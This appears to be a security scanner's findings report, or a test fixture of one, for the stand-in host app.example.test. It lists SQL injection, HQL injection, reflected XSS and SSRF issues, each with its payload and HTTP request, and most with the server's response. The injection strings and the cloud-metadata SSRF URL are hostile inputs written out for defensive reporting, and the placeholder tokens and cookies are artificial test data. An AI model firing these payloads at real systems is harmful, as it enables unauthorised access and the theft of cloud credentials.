name: SQL Injection in /api/users/login via username parameter
issue_background: The application fails to properly sanitize user input in the SQL query constructed during authentication.
request:
POST /api/users/login HTTP/1.1
Host: app.example.test
Authorization: Bearer secret-auth-token-12345
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=SuperSecretPassword99
response:
HTTP/1.1 500 Internal Server Error Content-Type: text/html

Database Error

SQLSTATE[42000]: Syntax error or access violation near 'OR 1=1'
evidence: Database error string reflected in server response when single quote probe supplied.

name: Hibernate SQL Injection in /api/users/login
issue_background: Hibernate HQL query construction allows parameter injection in login endpoint.
request:
POST /api/users/login HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=Password123
response:
HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<html><body>Hibernate QueryException in HQL parameter binding</body></html>
evidence: Cross-scanner duplicate finding reported by secondary scanner.

name: Reflected Cross-Site Scripting in /search via q parameter
issue_background: Unsanitized user input in query parameter 'q' is reflected directly in search results page.
request:
GET /search?q=%3Cscript%3Ealert%28%22XSS_TEST%22%29%3C%2Fscript%3E HTTP/1.1
Host: app.example.test
Cookie: sessionid=secret_session_cookie_abc123
response:
HTTP/1.1 200 OK
Content-Type: text/html

<html><body>Search results for: <script>alert("XSS_TEST")</script></body></html>
evidence: Script payload reflected verbatim without HTML entity encoding.

name: Cross-Site Scripting variant in /search error display
issue_background: Search parameter reflected in error page header.
response:
HTTP/1.1 200 OK
Content-Type: text/html

<html><body>Error processing query: <script>alert(1)</script></body></html>
evidence: Variant XSS payload reflected in HTTP response.

name: Server-Side Request Forgery in /api/fetch
issue_background: Outbound HTTP fetch service allows querying arbitrary internal IP endpoints including Cloud metadata.
request:
POST /api/fetch HTTP/1.1
Host: app.example.test
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/", "api_key": "secret-api-key-999"}
evidence: AWS metadata service responded with instance details.
